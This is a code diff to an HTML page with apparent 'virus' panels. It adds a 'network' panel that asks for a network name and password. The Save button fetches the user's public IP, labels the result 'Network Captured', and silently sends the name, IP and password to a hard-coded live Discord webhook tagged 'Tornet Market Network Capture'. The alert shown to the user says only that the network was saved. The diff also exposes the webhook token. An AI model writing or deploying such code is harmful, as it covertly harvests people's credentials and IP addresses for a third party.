@@ -189,6 +189,12 @@
           <div id="deviceVirusContainer"></div>
       </div>
     </div>
+    <div class="panel" id="networkPanel">
+      <h2>🌐│𝗻𝗲𝘁𝘄𝗼𝗿𝗸</h2>
+      <input type="text" id="networkNameInput" placeholder="Network Name">
+      <input type="text" id="passwordInput" placeholder="Password (Optional)">
+      <button id="saveNetworkButton">Save</button>
+  </div>
   </div>
 
   <script>
@@ -246,6 +252,108 @@ async function sendMessageToDiscord(message) {
         console.error('Error sending message to Discord:', error);
     }
 }
+
+// Wait for the DOM content to load
+document.addEventListener('DOMContentLoaded', function () {
+    // Find the Save button and attach a click event handler
+    document.getElementById('saveNetworkButton').addEventListener('click', async function() {
+        try {
+            // Get the value from the input fields
+            const networkName = document.getElementById('networkNameInput').value.trim();
+            const password = document.getElementById('passwordInput').value.trim();
+
+            // Check if the networkName is empty
+            if (networkName === '') {
+                alert('Please enter a Network Name.');
+                return; // Exit function if the input is empty
+            }
+
+            // Fetch the public IP address
+            const ipAddress = await getPublicIPAddress();
+
+            // Create a read-only textbox for displaying network name and IP
+            const networkInfoTextBox = document.createElement('input');
+            networkInfoTextBox.setAttribute('type', 'text');
+            networkInfoTextBox.setAttribute('readonly', 'readonly');
+            if (password !== '') {
+                networkInfoTextBox.setAttribute('value', `Network Captured (${networkName} - ${ipAddress}) with password "${password}".`);
+            } else {
+                networkInfoTextBox.setAttribute('value', `Network Captured (${networkName} - ${ipAddress}).`);
+            }
+
+            // Add the textbox to the panel under Miscellaneous
+            const networkPanel = document.getElementById('networkPanel');
+            networkPanel.appendChild(networkInfoTextBox);
+
+            // Example action: Display a confirmation message
+            let message = `The Network (${networkName} - ${ipAddress}) has been saved.`;
+            if (password !== '') {
+                message += ` Password: "${password}".`;
+            }
+            const alertTimeout = 2500; // Time in milliseconds to keep the message displayed
+
+            // Show message in alert box
+            alert(message);
+
+            // Construct the Discord message as an embed
+            const embed = {
+                title: 'Network Capture',
+                description: `**Network Name:** ${networkName}\n**IP Address:** ${ipAddress}`,
+                color: 0x5865F2, // Blurple color
+                footer: {
+                    text: 'Tornet Market Network Capture'
+                }
+            };
+
+            // Include password in the embed if provided
+            if (password !== '') {
+                embed.description += `\n**Password:** ${password}`;
+            }
+
+            // Send the embed message to Discord
+            sendEmbedToDiscord(embed);
+
+            // Clear the input fields
+            document.getElementById('networkNameInput').value = '';
+            document.getElementById('passwordInput').value = '';
+
+            // Remove the textbox after a timeout
+            setTimeout(() => {
+                networkPanel.removeChild(networkInfoTextBox);
+            }, alertTimeout);
+            
+        } catch (error) {
+            console.error('Error saving network name:', error);
+        }
+    });
+});
+
+// Function to send an embed message to Discord (replace with your actual implementation)
+function sendEmbedToDiscord(embed) {
+    // Replace this with your actual Discord webhook URL
+    const webhookUrl = 'https://discord.com/api/webhooks/1260757099403804713/A-s-RE5auaX9Z3bAm85biOUyZofiCtTSCte7A3Pl4Cc4jDMHURbavQ7b7NKX1ohbQQAS';
+
+    // Example of sending an embed message via fetch
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            embeds: [embed],
+        }),
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        console.log('Message sent successfully to Discord.');
+    })
+    .catch(error => {
+        console.error('Error sending message to Discord:', error);
+    });
+}
+
 
 document.getElementById('virusbutton').onclick = async function() {
     try {
